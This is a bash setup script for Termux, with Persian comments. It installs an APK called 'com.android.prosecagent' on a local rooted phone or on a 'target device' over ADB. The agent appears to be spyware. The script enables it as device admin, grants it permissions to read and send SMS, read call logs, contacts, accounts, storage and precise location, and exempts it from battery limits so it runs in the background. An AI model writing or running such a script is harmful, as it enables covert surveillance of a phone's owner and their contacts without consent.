#!/data/data/com.termux/files/usr/bin/bash
# اسم پکیج ایجنت
PKG_NAME="com.android.prosecagent"

# بررسی اینکه حالت local یا connected است
echo -e "\nChoose setup mode:"
echo "1. Local (on this rooted device)"
echo "2. ADB Connected Device (via USB)"
read -p "Enter mode [1/2]: " mode

if [[ "$mode" == "1" ]]; then
  echo -e "\n🔧 Running in LOCAL (Rooted A54) mode..."

  # فعال‌سازی Device Admin (نیازمند فعال بودن دریافت‌کننده)
  am broadcast -a android.app.action.DEVICE_ADMIN_ENABLED \
    -n "$PKG_NAME/.receiver.AdminReceiver"

  # فعال‌سازی همه permission های خطرناک
  pm grant "$PKG_NAME" android.permission.READ_PHONE_STATE
  pm grant "$PKG_NAME" android.permission.READ_SMS
  pm grant "$PKG_NAME" android.permission.RECEIVE_SMS
  pm grant "$PKG_NAME" android.permission.SEND_SMS
  pm grant "$PKG_NAME" android.permission.CALL_PHONE
  pm grant "$PKG_NAME" android.permission.READ_CALL_LOG
  pm grant "$PKG_NAME" android.permission.READ_CONTACTS
  pm grant "$PKG_NAME" android.permission.WRITE_CONTACTS
  pm grant "$PKG_NAME" android.permission.ACCESS_FINE_LOCATION
  pm grant "$PKG_NAME" android.permission.ACCESS_COARSE_LOCATION
  pm grant "$PKG_NAME" android.permission.ACCESS_NETWORK_STATE
  pm grant "$PKG_NAME" android.permission.ACCESS_WIFI_STATE
  pm grant "$PKG_NAME" android.permission.CHANGE_WIFI_STATE
  pm grant "$PKG_NAME" android.permission.BLUETOOTH
  pm grant "$PKG_NAME" android.permission.BLUETOOTH_ADMIN
  pm grant "$PKG_NAME" android.permission.GET_ACCOUNTS
  pm grant "$PKG_NAME" android.permission.READ_EXTERNAL_STORAGE
  pm grant "$PKG_NAME" android.permission.WRITE_EXTERNAL_STORAGE

  # Battery Saver settings
  dumpsys deviceidle whitelist +$PKG_NAME
  cmd appops set $PKG_NAME RUN_IN_BACKGROUND allow
  cmd appops set $PKG_NAME RUN_ANY_IN_BACKGROUND allow
  cmd appops set $PKG_NAME ALLOW_BACKGROUND_ACTIVITY_STARTS allow

  echo -e "\n✅ Local setup completed."

elif [[ "$mode" == "2" ]]; then
  echo -e "\n🔧 Running in ADB CONNECTED mode..."

  echo -e "⚠️ Make sure the target device is connected and USB Debugging is ON.\n"
  read -p "Press ENTER to continue when ready..."

  # نصب ایجنت از فایل APK
  read -p "Enter full path to APK file: " apk_path
  adb install "$apk_path"

  # اعطای پرمیژن‌ها با adb shell
  adb shell pm grant "$PKG_NAME" android.permission.READ_PHONE_STATE
  adb shell pm grant "$PKG_NAME" android.permission.READ_SMS
  adb shell pm grant "$PKG_NAME" android.permission.RECEIVE_SMS
  adb shell pm grant "$PKG_NAME" android.permission.SEND_SMS
  adb shell pm grant "$PKG_NAME" android.permission.CALL_PHONE
  adb shell pm grant "$PKG_NAME" android.permission.READ_CALL_LOG
  adb shell pm grant "$PKG_NAME" android.permission.READ_CONTACTS
  adb shell pm grant "$PKG_NAME" android.permission.WRITE_CONTACTS
  adb shell pm grant "$PKG_NAME" android.permission.ACCESS_FINE_LOCATION
  adb shell pm grant "$PKG_NAME" android.permission.ACCESS_COARSE_LOCATION
  adb shell pm grant "$PKG_NAME" android.permission.ACCESS_NETWORK_STATE
  adb shell pm grant "$PKG_NAME" android.permission.ACCESS_WIFI_STATE
  adb shell pm grant "$PKG_NAME" android.permission.CHANGE_WIFI_STATE
  adb shell pm grant "$PKG_NAME" android.permission.BLUETOOTH
  adb shell pm grant "$PKG_NAME" android.permission.BLUETOOTH_ADMIN
  adb shell pm grant "$PKG_NAME" android.permission.GET_ACCOUNTS
  adb shell pm grant "$PKG_NAME" android.permission.READ_EXTERNAL_STORAGE
  adb shell pm grant "$PKG_NAME" android.permission.WRITE_EXTERNAL_STORAGE

  # افزایش دسترسی به حالت unrestricted battery
  adb shell dumpsys deviceidle whitelist +$PKG_NAME
  adb shell cmd appops set $PKG_NAME RUN_IN_BACKGROUND allow
  adb shell cmd appops set $PKG_NAME RUN_ANY_IN_BACKGROUND allow
  adb shell cmd appops set $PKG_NAME ALLOW_BACKGROUND_ACTIVITY_STARTS allow

  echo -e "\n✅ ADB Connected device setup completed."

else
  echo "❌ Invalid mode selected. Exiting."
fi
